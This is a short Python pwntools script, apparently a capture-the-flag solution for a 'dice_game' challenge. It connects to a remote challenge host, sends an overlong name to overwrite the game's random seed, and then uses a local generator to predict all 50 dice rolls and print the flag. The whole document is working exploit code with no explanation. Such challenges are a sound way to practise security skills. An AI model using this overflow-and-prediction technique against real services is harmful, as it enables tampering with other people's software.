from pwn import *

gen=process('./gen_rand')
io=remote('111.198.29.45', 40154)
#io=process('./dice_game')

payload='a'*55+'a'+'a'+'a'*12
io.recvuntil('know your name: ')
io.send(payload)

for i in range(50):
    io.recvuntil('Give me the point(1~6): ')
    point=int(gen.recvline())%6+1
    print 'Game %d: %d' % (i+1, point)
    io.sendline(str(point))
    print io.recvline()

io.recvuntil('Congrats')
io.recvline()
print io.recvline()
